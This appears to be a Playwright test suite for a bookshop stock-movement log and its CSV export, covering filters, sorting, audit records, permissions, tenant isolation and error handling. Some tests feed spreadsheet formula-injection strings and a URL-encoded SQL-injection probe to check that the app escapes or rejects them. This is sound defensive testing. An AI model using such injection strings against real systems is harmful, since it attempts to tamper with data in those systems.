    ctx.on('request', (r) => { if (r.url().includes('/stock-movements/paged')) pagedUrls.push(r.url()); });
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const before = (await b.exportAudits(A.tenantId)).length;
    // Hold the response so the spinner caption can be read.
    await page.route('**/bookshop/stock-movements/export**', async (r) => { await new Promise((x) => setTimeout(x, 1500)); await r.continue(); });
    const dl = page.waitForEvent('download', { timeout: 60_000 });
    await exportButton(page).click();
    await expect(exportButton(page)).toContainText(COPY.preparing);
    await shot(page, 'export-preparing', false);
    const d = await dl;
    await expect(page.getByText(COPY.ready, { exact: true }).first()).toBeVisible({ timeout: 20_000 });
    await expect(exportButton(page)).toHaveText(/^\s*Export\s*$/);
    await expect(exportButton(page)).toBeEnabled();
    await shot(page, 'export-ready', false);
    expect(d.suggestedFilename()).toBe(fileName(b.utcDate(29), b.utcDate(0)));
    const raw = await readFile((await d.path())!, 'utf8');
    await mkdir(EV, { recursive: true });
    await writeFile(path.join(EV, 'sm558-export-default.csv'), raw);
    const rows = b.parseCsv(raw.replace(/^\uFEFF/, '')).filter((r) => r.length > 1);
    expect(rows[0]).toEqual(HEADER);
    const data = rows.slice(1);
    expect(data).toHaveLength(13);
    // Same rows, same order as the table's pages.
    // Compared with the table's own request (its sort included): page by page, the rows the user saw.
    const sent = new URL(pagedUrls[pagedUrls.length - 1]).searchParams;
    const sortQ = sent.get('sortBy') ? `&sortBy=${sent.get('sortBy')}&sortDir=${sent.get('sortDir')}` : '';
    const shown = await pagedAll(A, last30() + sortQ);
    expect(data.map((r) => `${r[0]}|${r[4]}|${r[5]}`)).toEqual(shown.map((s) => `${s.movementDate.slice(0, 10)}|${s.reason}|${s.quantity}`));
    for (const r of data) {
      expect(r[0]).toMatch(/^\d{4}-\d{2}-\d{2}$/);
      expect(r[9]).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?(Z|[+-]\d{2}:\d{2})$/);
      expect(Number.isNaN(Date.parse(r[9]))).toBe(false);
      expect(Number(r[7])).toBe(Number(r[6]) + Number(r[5]));
    }
    const small = seed.tie.variants.find((v) => v.name === 'Small')!;
    const tieSale = data.find((r) => r[1] === 'School Tie' && r[4] === 'Sale')!;
    expect(tieSale.slice(1, 6)).toEqual(['School Tie', 'Small', small.sku, 'Sale', '-3']);
    const bookPr = data.find((r) => r[1] === 'Oxford English Book 5' && r[4] === 'Purchase Receipt')!;
    expect(bookPr.slice(2, 9)).toEqual(['', seed.book.sku, 'Purchase Receipt', '50', '100', '150', LONG_NOTE]);
    expect(data.find((r) => r[4] === 'Stock Correction')![5]).toBe('-4');
    // Free text a spreadsheet would run as a formula keeps a leading apostrophe; quotes, commas and line breaks survive.
    expect(data.find((r) => r[4] === 'Damage')![8]).toBe(`'${FORMULA_NOTE}`);
    expect(data.find((r) => r[4] === 'Loss')![8]).toBe("'@SUM(1,2) crate missing");
    expect(data.find((r) => r[4] === 'Return to Supplier')![8]).toBe("'-3 misprinted copies");
    expect(tieSale[8]).toBe("'+92 counter sale");
    expect(data.find((r) => r[1] === 'Notebook A4' && r[4] === 'Sale')![8]).toBe(QUOTED_NOTE);
    const audits = await b.exportAudits(A.tenantId);
    expect(audits).toHaveLength(before + 1);
    const a = audits[audits.length - 1];
    expect(a.actorUserId).toBe(A.userId);
    expect(a.actorName).toBeTruthy();
    expect(a.rowCount).toBe(13);
    expect([a.dateFrom, a.dateTo]).toEqual([b.utcDate(29), b.utcDate(0)]);
    expect(Date.now() - Date.parse(a.exportedAtUtc)).toBeLessThan(5 * 60_000);
    expect(a.fileName).toBe(fileName(b.utcDate(29), b.utcDate(0)));
    console.log(`audit row: ${JSON.stringify({ ...a, actorUserId: '<owner>' })}`);
    await ctx.close();
  });

  test('exports only the filtered rows (reason Sale + one item) in the table\'s order', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await tickReasons(page, ['Sale']);
    await expectRowCount(page, 3);
    await search(page, 'Notebook');
    await expectRowCount(page, 1);
    const before = (await b.exportAudits(A.tenantId)).length;
    const csv = await exportCsv(page);
    expect(csv.rows.slice(1).map((r) => `${r[1]}|${r[4]}|${r[5]}`)).toEqual(['Notebook A4|Sale|-5']);
    const audit = (await b.exportAudits(A.tenantId)).slice(before);
    expect(audit).toHaveLength(1);
    expect(audit[0].rowCount).toBe(1);
    expect(audit[0].filters).toMatchObject({ reason: ['Sale'], search: 'Notebook' });
    await ctx.close();
  });

  // z94x8ednd3 (cycle 1 N2): Custom with no dates exported "This month" instead of the rows on screen.
  test('picking Custom before both dates are set keeps the rows on screen, and the export still matches them @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    await page.getByRole('combobox', { name: 'Date range' }).selectOption({ label: 'Custom' });
    await page.waitForTimeout(1000);
    // The list and tiles stay on the last 30 days (nothing is asked for until both ends are set) ...
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    await shot(page, 'custom-unset-before-export', false);
    // ... so Export should download those 13 rows under the last-30-days name.
    const csv = await exportCsv(page);
    console.log(`custom (unset) export: ${csv.name}, ${csv.rows.length - 1} rows; dates ${[...new Set(csv.rows.slice(1).map((r) => r[0]))].join(',')}`);
    await mkdir(EV, { recursive: true });
    await writeFile(path.join(EV, 'sm558-export-custom-unset.csv'), csv.raw);
    expect({ name: csv.name, rows: csv.rows.length - 1 }).toEqual({ name: fileName(b.utcDate(29), b.utcDate(0)), rows: 13 });
    await ctx.close();
  });

  // z94x8ednd3, second path from the ticket: an end date before the start date (the picker shows its message, the list is not reloaded).
  test('with an invalid Custom range on screen, Export still matches the rows shown (or is unavailable)', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await customRange(page, b.utcDate(5), b.utcDate(10));
    await expect(page.getByText(COPY.order, { exact: true })).toBeVisible({ timeout: 20_000 });
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    await shot(page, 'custom-invalid-before-export', false);
    if (await exportButton(page).isDisabled()) { console.log('Export disabled while the range is invalid'); await ctx.close(); return; }
    const csv = await exportCsv(page);
    console.log(`custom (invalid) export: ${csv.name}, ${csv.rows.length - 1} rows`);
    await writeFile(path.join(EV, 'sm558-export-custom-invalid.csv'), csv.raw);
    expect({ name: csv.name, rows: csv.rows.length - 1 }).toEqual({ name: fileName(b.utcDate(29), b.utcDate(0)), rows: 13 });
    await ctx.close();
  });

  // z94x8ednd3 cycle 3: after 49ff46b5, page turns, sort, search and the tiles must also keep the applied period
  // (cycle 2 only failed the export; Dan's fix put every request on the one applied period).
  test('with Custom selected and no dates, page turns, sort, search, tiles and Export stay on the applied Last 30 days @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    const sent: { path: string; q: URLSearchParams }[] = [];
    page.on('request', (r) => {
      const u = new URL(r.url());
      if (u.pathname.includes('/stock-movements/')) sent.push({ path: u.pathname, q: u.searchParams });
    });
    const applied = () => ({ from: b.utcDate(29), to: b.utcDate(0) });
    const datesOf = (q?: URLSearchParams) => q ? { from: q.get('dateFrom'), to: q.get('dateTo') } : undefined;
    const thisMonthFrom = b.utcDate(0).slice(0, 8) + '01';

    await page.getByRole('combobox', { name: 'Date range' }).selectOption({ label: 'Custom' });
    await page.waitForTimeout(1000);
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);

    // This month would be 12 rows, so page 2 would have 2 rows and the tiles would drop the 29-day-old adjustment.
    await page.getByRole('button', { name: /Next/ }).click();
    await expectRowCount(page, 3);
    await expectTiles(page, [13, 6, 5, 2]);
    const page2 = [...sent].reverse().find((s) => s.path.includes('/paged') && s.q.get('page') === '2');
    expect(datesOf(page2?.q), 'page 2 keeps the applied Last 30 days').toEqual(applied());
    expect(page2?.q.get('dateFrom'), 'must not fall back to This month').not.toBe(thisMonthFrom);
    await shot(page, 'custom-unset-page2', false);
    await page.getByRole('button', { name: /Previous|Prev/ }).first().click();
    await expectRowCount(page, 10);

    const beforeSort = sent.length;
    await table(page).getByRole('columnheader', { name: 'Quantity' }).getByRole('button').click();
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    const sortQ = sent.slice(beforeSort).filter((s) => s.path.includes('/paged') && s.q.get('sortBy') === 'quantity').pop();
    expect(datesOf(sortQ?.q), 'sort keeps the applied period').toEqual(applied());

    const csv = await exportCsv(page);
    await mkdir(EV, { recursive: true });
    await writeFile(path.join(EV, 'sm558-export-custom-unset-after-sort.csv'), csv.raw);
    expect({ name: csv.name, rows: csv.rows.length - 1 }).toEqual({ name: fileName(b.utcDate(29), b.utcDate(0)), rows: 13 });
    expect(csv.rows.slice(1).some((r) => r[0] === b.utcDate(29) && r[4] === 'Stock Correction'), 'the 29-day-old row stays in the export').toBe(true);

    const beforeSearch = sent.length;
    await search(page, 'Oxford');
    const searchQ = sent.slice(beforeSearch).filter((s) => s.path.includes('/paged') && (s.q.get('search') ?? '').toLowerCase().includes('oxford')).pop();
    expect(datesOf(searchQ?.q), 'search keeps the applied period').toEqual(applied());
    const oxfordCsv = await exportCsv(page);
    expect(oxfordCsv.name).toBe(fileName(b.utcDate(29), b.utcDate(0)));
    expect(oxfordCsv.rows.slice(1).some((r) => r[0] === b.utcDate(29) && r[4] === 'Stock Correction')).toBe(true);
    await shot(page, 'custom-unset-after-search', false);
    await ctx.close();
  });

  test('with an invalid Custom range, page turns, sort, search, tiles and Export stay on the applied Last 30 days', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const sent: URLSearchParams[] = [];
    page.on('request', (r) => { if (r.url().includes('/stock-movements/')) sent.push(new URL(r.url()).searchParams); });
    await customRange(page, b.utcDate(5), b.utcDate(10));
    await expect(page.getByText(COPY.order, { exact: true })).toBeVisible({ timeout: 20_000 });
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);

    await page.getByRole('button', { name: /Next/ }).click();
    await expectRowCount(page, 3);
    await expectTiles(page, [13, 6, 5, 2]);
    const page2 = [...sent].reverse().find((q) => q.get('page') === '2');
    expect({ from: page2?.get('dateFrom'), to: page2?.get('dateTo') }).toEqual({ from: b.utcDate(29), to: b.utcDate(0) });
    await page.getByRole('button', { name: /Previous|Prev/ }).first().click();
    await expectRowCount(page, 10);

    const beforeSort = sent.length;
    await table(page).getByRole('columnheader', { name: 'Item' }).getByRole('button').click();
    await expectRowCount(page, 10);
    const sortQ = sent.slice(beforeSort).filter((q) => q.get('sortBy') === 'item').pop();
    expect({ from: sortQ?.get('dateFrom'), to: sortQ?.get('dateTo') }).toEqual({ from: b.utcDate(29), to: b.utcDate(0) });
    await expectTiles(page, [13, 6, 5, 2]);

    const beforeSearch = sent.length;
    await search(page, 'Notebook');
    const searchQ = sent.slice(beforeSearch).filter((q) => (q.get('search') ?? '').toLowerCase().includes('notebook')).pop();
    expect({ from: searchQ?.get('dateFrom'), to: searchQ?.get('dateTo') }).toEqual({ from: b.utcDate(29), to: b.utcDate(0) });
    await shot(page, 'custom-invalid-after-search', false);
    await ctx.close();
  });

  test('the export follows the sort it is given (API: quantity ascending, item descending)', async () => {
    for (const sort of ['sortBy=quantity&sortDir=asc', 'sortBy=item&sortDir=desc', 'sortBy=user&sortDir=asc']) {
      const res = await A.api.get(`bookshop/stock-movements/export?${last30()}&${sort}`);
      expect(res.status()).toBe(200);
      const rows = b.parseCsv(await res.text()).filter((r) => r.length > 1).slice(1);
      const shown = await pagedAll(A, `${last30()}&${sort}`);
      expect(rows.map((r) => `${r[4]}|${r[5]}|${r[1]}`), sort).toEqual(shown.map((s) => `${s.reason}|${s.quantity}|${s.itemName}`));
    }
  });

  test('an empty result shows the exact toast, downloads nothing and writes no audit row', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await customRange(page, b.utcDate(60), b.utcDate(50));
    await expect(page.getByText(COPY.empty, { exact: true })).toBeVisible({ timeout: 20_000 });
    const before = (await b.exportAudits(A.tenantId)).length;
    let downloaded = false;
    page.on('download', () => { downloaded = true; });
    await exportButton(page).click();
    await expect(page.getByText(COPY.nothing, { exact: true }).first()).toBeVisible({ timeout: 20_000 });
    await expect(page.getByText(COPY.nothingMsg, { exact: true }).first()).toBeVisible();
    await shot(page, 'export-empty', false);
    await page.waitForTimeout(2000);
    expect(downloaded).toBe(false);
    expect((await b.exportAudits(A.tenantId)).length).toBe(before);
    await expect(exportButton(page)).toBeEnabled();
    // The API answers the same view with 204 and no audit row either.
    const r = await A.api.get(`bookshop/stock-movements/export?dateFrom=${b.utcDate(60)}&dateTo=${b.utcDate(50)}`);
    expect(r.status()).toBe(204);
    expect((await b.exportAudits(A.tenantId)).length).toBe(before);
    await ctx.close();
  });

  test('over 10,000 rows asks first with the exact copy: Cancel downloads nothing, Continue downloads every row', async ({ browser }) => {
    test.setTimeout(6 * 60_000);
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await customRange(page, b.utcDate(101), b.utcDate(99));
    await expectTiles(page, [10_001, 10_001, 0, 0]);
    const before = (await b.exportAudits(A.tenantId)).length;
    let downloads = 0;
    page.on('download', () => { downloads++; });
    await exportButton(page).click();
    const dialog = page.getByRole('alertdialog').or(page.getByRole('dialog')).filter({ hasText: 'rows' });
    await expect(dialog).toBeVisible({ timeout: 20_000 });
    await expect(dialog).toContainText(COPY.large('10,001'));
    await shot(page, 'export-large-confirm', false);
    await dialog.getByRole('button', { name: 'Cancel' }).click();
    await expect(dialog).toBeHidden();
    await page.waitForTimeout(2000);
    expect(downloads).toBe(0);
    expect((await b.exportAudits(A.tenantId)).length).toBe(before);
    await expect(exportButton(page)).toBeEnabled();
    const dl = page.waitForEvent('download', { timeout: 120_000 });
    await exportButton(page).click();
    await expect(dialog).toBeVisible({ timeout: 20_000 });
    await dialog.getByRole('button', { name: 'Continue' }).click();
    const d = await dl;
    const rows = b.parseCsv((await readFile((await d.path())!, 'utf8')).replace(/^\uFEFF/, '')).filter((r) => r.length > 1);
    expect(rows.length - 1).toBe(10_001);
    expect(d.suggestedFilename()).toBe(fileName(b.utcDate(101), b.utcDate(99)));
    await expect(page.getByText(COPY.ready, { exact: true }).first()).toBeVisible({ timeout: 30_000 });
    const audits = (await b.exportAudits(A.tenantId)).slice(before);
    expect(audits.map((x) => x.rowCount)).toEqual([10_001]);
    await ctx.close();
  });

  test('over the 50,000-row server limit the export is refused with a message, never a 500 or a partial file', async ({ browser }) => {
    test.setTimeout(4 * 60_000);
    const before = (await b.exportAudits(A.tenantId)).length;
    const r = await api(A, `bookshop/stock-movements/export?dateFrom=${b.utcDate(201)}&dateTo=${b.utcDate(199)}`);
    expect(r.status).toBe(400);
    expect(r.text).toContain('50,000');
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await customRange(page, b.utcDate(201), b.utcDate(199));
    await expectTiles(page, [50_001, 50_001, 0, 0]);
    await exportButton(page).click();
    await expect(page.getByText(/Exports are limited to 50,000 rows/).first()).toBeVisible({ timeout: 20_000 });
    await shot(page, 'export-over-limit', false);
    expect((await b.exportAudits(A.tenantId)).length).toBe(before);
    await ctx.close();
  });

  test('a server failure shows the exact toast and re-enables the button; nothing is downloaded or audited', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const before = (await b.exportAudits(A.tenantId)).length;
    let downloads = 0;
    page.on('download', () => { downloads++; });
    for (const fail of [
      (r: any) => r.fulfill({ status: 500, body: 'boom' }),
      (r: any) => r.abort('timedout'),
    ]) {
      await page.route('**/bookshop/stock-movements/export**', fail);
      await exportButton(page).click();
      await expect(page.getByText(COPY.failed, { exact: true }).first()).toBeVisible({ timeout: 20_000 });
      await expect(exportButton(page)).toBeEnabled();
      await expect(exportButton(page)).toHaveText(/^\s*Export\s*$/);
      await page.unroute('**/bookshop/stock-movements/export**');
    }
    await shot(page, 'export-failure', false);
    expect(downloads).toBe(0);
    expect((await b.exportAudits(A.tenantId)).length).toBe(before);
    await ctx.close();
  });
});

// ── Permissions, tenants, validation, mobile ──────────────────────────────────────────────────

/** DB SETUP: campus C's owner holds `role` instead of the creator's Head Admin matrix (stand-in for a staff member). */
async function actAs(role: { systemRole?: string; customRoleId?: string }) {
  const mongo = process.env.QA_MONGOSH!;
  const url = process.env.QA_MONGO_URL!;
  const { execFile } = await import('node:child_process');
  const { promisify } = await import('node:util');
  const run = promisify(execFile);
  console.log(`[DB SETUP mongo] tenant ${seed.c.tenantId}: CreatedBy -> another id, so the owner is no longer the creator`);
  await run(mongo, [url, '--quiet', '--eval', `db.tenants.updateOne({_id: ObjectId('${seed.c.tenantId}')}, {$set: {CreatedBy: '000000000000000000000558'}})`]);
  await f.dbSetup(`campus C owner holds ${JSON.stringify(role)}`, `
    delete from "AccessRoleAssignments" where "TenantId" = ${f.sqlQuote(seed.c.tenantId)} and "UserId" = ${f.sqlQuote(C.userId)};
    insert into "AccessRoleAssignments" ("Id","TenantId","UserId","AccessRoleId","SystemRoleName","Scope","CreatedDate","CreatedBy")
    values (gen_random_uuid(), ${f.sqlQuote(seed.c.tenantId)}, ${f.sqlQuote(C.userId)}, ${role.customRoleId ? f.sqlQuote(role.customRoleId) + '::uuid' : 'null'},
            ${role.systemRole ? f.sqlQuote(role.systemRole) : 'null'}, 'Tenant', now(), 'qa558')`);
  await C.refreshToken();
}

test.describe('Permissions, tenants and validation', () => {
  test('Export needs the Bookshop Export permission: hidden and 403 without it, shown and working for Bookshop Admin', async ({ browser }) => {
    test.setTimeout(5 * 60_000);
    await actAs({ customRoleId: seed.c.viewerRoleId });
    let ctx = await ownerContext(browser, C, {}, true);
    let page = await openLog(ctx);
    await expectRowCount(page, 1);
    await expect(exportButton(page)).toHaveCount(0);
    await shot(page, 'perm-no-export', false);
    const denied = await api(C, `bookshop/stock-movements/export?${last30()}`);
    expect(denied.status).toBe(403);
    expect((await api(C, `bookshop/stock-movements/paged?page=1&pageSize=10&${last30()}`)).status).toBe(200);
    await ctx.close();
    await actAs({ systemRole: 'Bookshop Admin' });
    ctx = await ownerContext(browser, C, {}, true);
    page = await openLog(ctx);
    await expectRowCount(page, 1);
    const csv = await exportCsv(page);
    expect(csv.rows.slice(1).map((r) => r[1])).toEqual(['Permission Ruler']);
    await ctx.close();
  });

  test('without Bookshop See the page shows the exact access-denied copy and the API refuses the log, summary and export', async ({ browser }) => {
    test.setTimeout(5 * 60_000);
    await actAs({ systemRole: 'Teacher' });
    const ctx = await ownerContext(browser, C, {}, true);
    const page = await ctx.newPage();
    await page.goto(LOG);
    await expect(page.getByText(COPY.denied, { exact: true }).first()).toBeVisible({ timeout: 60_000 });
    await expect(table(page)).toHaveCount(0);
    await expect(exportButton(page)).toHaveCount(0);
    await shot(page, 'perm-denied', false);
    for (const u of ['paged?page=1&pageSize=10', 'summary', 'export']) {
      expect((await api(C, `bookshop/stock-movements/${u}`)).status, u).toBe(403);
    }
    await ctx.close();
  });

  test('another campus sees none of these movements, even with this campus\'s item id', async () => {
    const bRows = await pagedAll(B, last30());
    expect(bRows.map((r) => r.itemName)).toEqual(['Other School Atlas']);
    expect((await f.ok(await B.api.get(`bookshop/stock-movements/paged?page=1&pageSize=10&itemId=${seed.tie.id}`), 'B with A item')).totalCount).toBe(0);
    expect((await f.ok(await B.api.get(`bookshop/stock-movements/summary?itemId=${seed.tie.id}`), 'B summary')).movements.count).toBe(0);
    expect((await B.api.get(`bookshop/stock-movements/export?itemId=${seed.tie.id}&${last30()}`)).status()).toBe(204);
    const bAll = await B.api.get(`bookshop/stock-movements/export?${last30()}`);
    expect(bAll.status()).toBe(200);
    const text = await bAll.text();
    expect(text).toContain('Other School Atlas');
    expect(text).not.toContain('Oxford English Book 5');
    // A's audit rows are not B's.
    expect((await b.exportAudits(B.tenantId)).every((x) => x.actorUserId === B.userId)).toBe(true);
  });

  test('bad query strings are validation errors, never 500s (paged, summary, export)', async () => {
    const cases = [
      ['dateFrom only', `dateFrom=${b.utcDate(3)}`],
      ['end before start', `dateFrom=${b.utcDate(2)}&dateTo=${b.utcDate(5)}`],
      ['367 days', `dateFrom=${b.utcDate(366)}&dateTo=${b.utcDate(0)}`],
      ['unknown reason', `reason=Bogus&${last30()}`],
      ['malformed date', 'dateFrom=2026-13-45&dateTo=2026-11-01'],
      ['not a date', 'dateFrom=yesterday&dateTo=today'],
    ];
    const results: string[] = [];
    for (const route of ['paged?page=1&pageSize=10&', 'summary?', 'export?']) {
      for (const [label, q] of cases) {
        const r = await api(A, `bookshop/stock-movements/${route}${q}`);
        results.push(`${route.split('?')[0]} ${label}: ${r.status} ${r.text.slice(0, 120).replace(/\s+/g, ' ')}`);
        expect(r.status, `${route} ${label}: ${r.text.slice(0, 200)}`).toBe(400);
      }
    }
    for (const q of ['sortBy=nope&sortDir=desc', 'sortDir=sideways', 'pageSize=100000', 'page=-1', `itemId=not-a-guid`, 'search=%25%27%22%3B--']) {
      const r = await api(A, `bookshop/stock-movements/paged?${q.startsWith('page') ? q : 'page=1&pageSize=10&' + q}&${last30()}`);
      results.push(`paged ${q}: ${r.status}`);
      expect(r.status, `${q}: ${r.text.slice(0, 200)}`).toBeLessThan(500);
    }
    console.log(results.join('\n'));
  });

  test('Pixel 5: no sideways scroll, two tiles a row, the audit columns fold away, and Export still downloads', async ({ browser }) => {
    const { defaultBrowserType, ...pixel } = devices['Pixel 5'];
    const ctx = await ownerContext(browser, A, pixel);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    expect(await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth), 'no horizontal scroll').toBeLessThanOrEqual(0);
    const tops = await page.locator('[data-movements-tiles] [data-tile]').evaluateAll((els) => els.map((e) => Math.round(e.getBoundingClientRect().top)));
    expect(new Set(tops).size, 'tiles in two rows').toBe(2);
    for (const h of ['Before', 'After', 'User', 'Notes']) await expect(table(page).getByRole('columnheader', { name: h })).toBeHidden();
    await shot(page, 'mobile-pixel5');
    const csv = await exportCsv(page);
    expect(csv.rows.length - 1).toBe(13);
    await ctx.close();
  });
});

// ── PR 558 review fixes in ab53aab0 (T5 / T6) ───────────────────────────────────────────────────

test.describe('Item detail user after the CreatedByName backfill (T5)', () => {
  // T5: after the backfill stamps ModifiedBy as System, item detail must show the stored CreatedByName, never "by System".
  test('item detail names a backfilled movement by its stored CreatedByName, not the System stamp', async ({ browser }) => {
    const item = await b.createItem(A, { name: 'Backfill Probe Pen' });
    const before = await f.sql(`select "Id","CreatedByName","CreatedBy","ModifiedBy" from "BookshopStockMovements" where "BookshopItemId" = ${f.sqlQuote(item.id)}`);
    expect(before.length, `opening movement for ${item.id}: ${JSON.stringify(before)}`).toBeGreaterThan(0);
    const storedName = before[0][1];
    expect(storedName, 'opening stock should already carry a display name').toBeTruthy();
    expect(storedName, 'the stored name itself must not be System').not.toMatch(/^System$/i);
    await f.dbSetup(`PR 558 T5: stamp ModifiedBy=System on the opening movement of ${item.id} (as the CreatedByName backfill does)`, `
      update "BookshopStockMovements"
      set "ModifiedBy" = 'System', "ModifiedDate" = now() at time zone 'utc'
      where "BookshopItemId" = ${f.sqlQuote(item.id)}`);
    const after = await f.sql(`select "CreatedByName","ModifiedBy" from "BookshopStockMovements" where "BookshopItemId" = ${f.sqlQuote(item.id)}`);
    expect(after[0][0]).toBe(storedName);
    expect(after[0][1]).toBe('System');

    const ctx = await ownerContext(browser, A);
    const page = await ctx.newPage();
    await page.goto(`/bookshop/inventory/${item.id}`);
    await expect(page.getByRole('heading', { name: item.name })).toBeVisible({ timeout: 60_000 });
    const movements = page.locator('[data-item-movements]');
    await expect(movements.getByText(storedName, { exact: true })).toBeVisible({ timeout: 20_000 });
    await expect(movements).not.toContainText(/^System$|\bby System\b/);
    const lastUpdated = page.locator('[data-tile="last-updated"]');
    await expect(lastUpdated).toContainText(`by ${storedName}`);
    await expect(lastUpdated).not.toContainText('by System');
    await shot(page, 'item-detail-backfilled-user', false);
    // The Stock Movements log names the same movement the same way.
    const log = await openLog(ctx, `${LOG}?item=${item.id}`);
    await expectRowCount(log, 1);
    await expect(bodyRows(log)).toContainText(storedName);
    await expect(bodyRows(log)).not.toContainText('System');
    await ctx.close();
  });
});
